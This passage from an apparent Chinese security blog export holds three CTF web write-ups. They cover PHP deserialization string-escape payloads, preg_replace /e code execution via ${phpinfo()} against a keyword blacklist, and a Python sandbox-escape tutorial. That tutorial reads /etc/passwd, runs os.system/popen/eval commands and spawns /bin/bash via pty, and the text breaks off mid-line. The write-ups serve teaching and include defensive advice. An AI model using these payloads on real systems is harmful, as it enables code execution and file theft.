class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\">                                <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">else</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;wrong password&#x27;</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;Firebasky&#x27;</span>,<span class=\"string\">&#x27;Firebaskyup&#x27;</span>,<span class=\"variable\">$string</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_GET</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"variable\">$ser</span>=<span class=\"title function_ invoke__\">filter</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">a</span>(<span class=\"variable\">$uname</span>,<span class=\"variable\">$password</span>)));</span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$ser</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>简单审计一下，uname参数可控，password值为1不可控，而题目需要password等于yu22x才能出flag。</p>\n<p>同时我们发现了题目存在filter方法替换字符串Firebasky为Firebaskyup，增加了两个字符，并且位于序列化步骤之后，最后在反序列化，所以可能存在字符串逃逸。</p>\n<p>解题步骤</p>\n<ol>\n<li>确认要伪造的数据及长度</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;        //长度为30</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>构造方程式求解</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">30+9x=11x        //x=15</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>确定payload</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-8.png\" alt=\"img\"></p>\n<h3 id=\"3-2-安洵杯-2019-easy-serialize-php-（字符串减少）\"><a href=\"#3-2-安洵杯-2019-easy-serialize-php-（字符串减少）\" class=\"headerlink\" title=\"3.2 [安洵杯 2019]easy_serialize_php （字符串减少）\"></a>3.2 [安洵杯 2019]easy_serialize_php （字符串减少）</h3><p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$function</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$img</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>,<span class=\"string\">&#x27;php4&#x27;</span>,<span class=\"string\">&#x27;fl1g&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$filter_arr</span>).<span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>,<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$img</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unset</span>(<span class=\"variable\">$_SESSION</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&quot;user&quot;</span>] = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;function&#x27;</span>] = <span class=\"variable\">$function</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$function</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>])&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;guest_img.png&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">sha1</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$serialize_info</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$_SESSION</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;phpinfo();&#x27;</span>); <span class=\"comment\">//maybe you can find something in here!</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;show_image&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$userinfo</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialize_info</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$userinfo</span>[<span class=\"string\">&#x27;img&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>审计一下，先让function参数等于phpinfo，来到phpinfo界面，发现一个php文件</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-9.png\" alt=\"img\"></p>\n<p>想办法读取，代码中文件读取的位置在</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-10.png\" alt=\"img\"></p>\n<p>所以function参数得等于show_image，并且读取的是base64解码后的$userinfo[‘img’]，而</p>\n<p>$userinfo是$serialize_info的反序列化对象，同时$serialize_info是序列化然后经过filter方法的$_SESSION，其中的user固定但是可以SESSION覆盖，function同理。filter将黑名单里的字符串替换为空，可能存在字符串逃逸。</p>\n<p>攻击步骤（可以本地搭建环境然后和漏洞演示一样同步输出序列化和filter替换后的值辅助分析）</p>\n<ol>\n<li>确认要被吞掉的数据及长度（这里如果只取”;s:8:”function”;s:42:的话长度为22并不是替换字符串长度差值的倍速，所以可以自己加一点数据，反正后面也是用_SESSION[function]传上去然后给吞的）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;function&quot;;s:65:&quot;a</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>构造方程求解（3x或4x）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">24+0=4x        //x=6</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>确认伪造的数据（function用不上了可以随便赋值）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>得到最终payload</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//POST</span><br><span class=\"line\"></span><br><span class=\"line\">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-11.png\" alt=\"img\"></p>\n<p>flag在另一个文件里，只要换一下base64的值就好了并且使长度一致就可以了</p>\n<p><img src=\"/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/1699217660912-12.png\" alt=\"img\"></p>\n<h1 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04 修复建议\"></a>0x04 修复建议</h1><p>注意一下代码逻辑，对用户输入的过滤大多数情况都要放在第一位，然后过滤最好用白名单，要是不方便或者只能黑名单那么匹配到黑名单里的值最好是直接拦截掉，替换的操作还是比较危险的</p>\n","categories":["CTF","WEB"],"tags":["PHP反序列化"]},{"title":"preg_replace函数在/e修饰符下的代码执行漏洞","url":"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a><strong>0x00 前言</strong></h1><p>最近在一个新生赛中遇到了这样一个考点，感觉蛮有意思的，记录一下解决过程</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-漏洞成因\"><a href=\"#0x01-漏洞成因\" class=\"headerlink\" title=\"0x01 漏洞成因\"></a>0x01 漏洞成因</h1><p>先来看一下<code>preg_replace</code>函数的语法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mixed</span> <span class=\"title function_ invoke__\">preg_replace</span> ( <span class=\"keyword\">mixed</span> <span class=\"variable\">$pattern</span> , <span class=\"keyword\">mixed</span> <span class=\"variable\">$replacement</span> , <span class=\"keyword\">mixed</span> <span class=\"variable\">$subject</span> [, <span class=\"keyword\">int</span> <span class=\"variable\">$limit</span> = -<span class=\"number\">1</span> [, <span class=\"keyword\">int</span> &amp;<span class=\"variable\">$count</span> ]] )</span><br></pre></td></tr></table></figure>\n\n<p>平时我们经常用它来做一些字符的替换</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"string\">&#x27;aaBbcc&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/bb/i&#x27;</span>, <span class=\"string\">&#x27;dd&#x27;</span>, <span class=\"variable\">$str</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$str</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.PNG\" alt=\"img\"></p>\n<p><code>pattern</code>参数支持正则表达式，而在PHP中正则表达式的<code>/e</code>修饰符会使<code>preg_replace</code>在成功匹配的情况下将中间的<code>replacement</code>参数当作PHP代码执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/ydj/e&#x27;</span>,<span class=\"string\">&#x27;phpinfo()&#x27;</span>, <span class=\"string\">&#x27;ydj666&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.PNG\" alt=\"img\"></p>\n<p>值得一提的是，PHP7已经修复了这个问题</p>\n<h1 id=\"0x02-漏洞利用\"><a href=\"#0x02-漏洞利用\" class=\"headerlink\" title=\"0x02 漏洞利用\"></a>0x02 漏洞利用</h1><p>先来看看题目给出的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pattern&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pattern&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| |\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\&amp;|\\*|\\%/i&quot;</span>,<span class=\"variable\">$code</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"variable\">$code</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/(&#x27;</span> . <span class=\"variable\">$pattern</span> . <span class=\"string\">&#x27;)/ei&#x27;</span>,<span class=\"string\">&#x27;print_r(&quot;\\\\1&quot;)&#x27;</span>, <span class=\"variable\">$code</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you are smart&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;try again&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;it is begin&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到<code>preg_replace</code>函数使用了<code>/e</code>修饰符，符合代码执行的条件，但是第二个参数却是一段固定的代码，咋一看好像无法利用。但是我们发现了该参数中的<code>\\\\1</code>看起来有点奇怪，当我们尝试着去匹配一些字符串的时候该参数代码执行的结果却是打印出我们匹配到的字符</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png\" alt=\"img\"></p>\n<p>带着疑问去百度了一下，终于在<a href=\"https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html\">w3cschool</a>中找到了答案</p>\n<blockquote>\n<p>反向引用：</p>\n<p>对一个正则表达式模式或部分模式两边添加<strong>圆括号</strong>将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>\n<p>所以 \\1 指定第一个子匹配项</p>\n</blockquote>\n<p>观察题目，我们可以发现正则表达式的部分确实加上了圆括号</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png\" alt=\"img\"></p>\n<p>这就意味着第二个参数也存在着我们可控的地方，但是<code>\\1</code>是被当成字符串来操作的，有没有办法可以让字符串的内容也可以代码执行呢？继续查找资料，发现了PHP中有一个叫<a href=\"https://www.php.net/manual/zh/language.variables.variable.php\">可变变量</a>的东西<code>$&#123;&#125;</code>，类似于Linux中<code>$()</code>的用法，</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png\" alt=\"img\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;$&#123;phpinfo()&#125;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png\" alt=\"img\"></p>\n<p>也就是说，<code>$&#123;phpinfo()&#125;</code>中的<code>phpinfo()</code>会被当做变量先执行而且只能适用于双引号字符串，单引号不行</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.png\" alt=\"img\"></p>\n<p>还好题目恰好是双引号字符串，符合条件，所以现在代码执行的问题也解决了，剩下的就是想办法让参数一的正则表达式能够成功匹配到我们想要匹配的字符<code>&quot;$&#123;phpinfo()&#125;&quot;</code>，这里我们选择常见的<code>.*</code>（匹配任何字符（包括换行符）零个或多个），最后去题目传参</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png\" alt=\"img\"></p>\n<p>成功执行phpinfo找到flag</p>\n<h1 id=\"0x03-漏洞防御\"><a href=\"#0x03-漏洞防御\" class=\"headerlink\" title=\"0x03 漏洞防御\"></a>0x03 漏洞防御</h1><ul>\n<li>使用安全的函数<code>preg_replace_callback</code>，在报错中也可以看到官方给出的告警</li>\n</ul>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png\" alt=\"img\"></p>\n<ul>\n<li>选择单引号闭合</li>\n</ul>\n<p>双引号</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png\" alt=\"img\"></p>\n<p>单引号</p>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png\" alt=\"img\"></p>\n<ul>\n<li>正则表达式不加括号（不捕获）</li>\n</ul>\n<p><img src=\"/2023/11/06/preg-replace%E5%87%BD%E6%95%B0%E5%9C%A8-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png\" alt=\"img\"></p>\n<h1 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h1><p>该漏洞点比较简单，但是还是很值得分析一下的，其实我们可以发现许多漏洞的产生往往发生在一些比较方便的功能上，怪不得圈内总是流传着这么一句话：PHP是世界上最好的语言</p>\n","categories":["CTF","WEB"],"tags":["PHP"]},{"title":"Python沙箱逃逸","url":"/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<p>0x00 前言<br>文章内容比较基础，希望能给对python沙箱逃逸比较陌生的师傅们提供一点思路</p>\n<span id=\"more\"></span>\n\n<p>0x01 漏洞原理<br>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种waf的过滤和限制，最终造成文件读写，命令执行等恶意操作<br>0x02 利用方式</p>\n<ol>\n<li>文件读写</li>\n</ol>\n<ul>\n<li>file<blockquote>\n<blockquote>\n<blockquote>\n<p>file(“&#x2F;etc&#x2F;passwd”).read()    #python2<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\\n ……’<br>file(“test1”,”w”).write(“Hello World!”)    #python2<br>file(“test1”).read()<br>‘Hello World!’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>open<blockquote>\n<blockquote>\n<blockquote>\n<p>open(“&#x2F;etc&#x2F;passwd”).read()<br>‘root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash\\ndaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync\\ngames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin\\nnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin\\n ……’<br>open(“test2”,”w”).write(“Hello World!”)<br>open(“test2”).read()<br>‘Hello World!’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<ol start=\"2\">\n<li>基础命令执行</li>\n</ol>\n<ul>\n<li>system<blockquote>\n<blockquote>\n<blockquote>\n<p>import os<br>os.system(‘whoami’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>popen<blockquote>\n<blockquote>\n<blockquote>\n<p>import os<br>os.popen(“whoami”).read()<br>‘ydj\\n’</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>eval<blockquote>\n<blockquote>\n<blockquote>\n<p>eval(‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>exec<blockquote>\n<blockquote>\n<blockquote>\n<p>exec(‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>sys<blockquote>\n<blockquote>\n<blockquote>\n<p>import sys<br>sys.modules[“os”].system(“whoami”)<br>ydj</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>pty<blockquote>\n<blockquote>\n<blockquote>\n<p>import pty<br>pty.spawn(“whoami”)<br>ydj<br>pty.spawn(“&#x2F;bin&#x2F;bash”)    #直接获取一个bash<br>┌──(ydj㉿LAPTOP-T0I7OJP0)-[~]<br>└─$ exit<br>exit</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>execfile<blockquote>\n<blockquote>\n<blockquote>\n<p>execfile(“&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py”)    